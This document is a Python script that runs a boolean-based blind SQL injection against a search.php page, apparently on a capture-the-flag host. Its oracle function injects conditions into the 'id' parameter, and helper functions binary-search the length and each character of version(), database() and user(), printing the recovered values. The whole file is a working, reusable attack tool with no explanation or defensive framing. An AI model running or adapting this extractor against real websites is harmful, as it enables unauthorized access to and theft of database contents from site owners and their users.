#!/usr/bin/env python3
"""Extract version, user, database info via boolean blind SQLi on search.php"""
import urllib.request
import sys

BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"

def oracle(condition):
    """True='NO! Not this!', False='yingyingying~'"""
    url = f"{BASE}?id=2-({condition})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8', errors='ignore')
        return 'NO! Not this!' in resp
    except:
        return None

def extract_len(func):
    """Binary search string length"""
    lo, hi = 0, 100
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"length({func})>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

def extract_char(func, pos):
    """Binary search ASCII char"""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"ord(substring({func},{pos},1))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo) if lo >= 32 else f'\\x{lo:02x}'

def extract_str(func):
    """Extract full string"""
    length = extract_len(func)
    print(f"  Length: {length}")
    result = ""
    for pos in range(1, length + 1):
        c = extract_char(func, pos)
        result += c
        print(f"  [{pos}/{length}] '{c}' => {result}")
    return result

if __name__ == '__main__':
    print("[*] Extracting version()...")
    ver = extract_str("version()")
    print(f"[+] version() = {ver}")

    print("\n[*] Extracting database()...")
    db = extract_str("database()")
    print(f"[+] database() = {db}")

    print("\n[*] Extracting user()...")
    user = extract_str("user()")
    print(f"[+] user() = {user}")
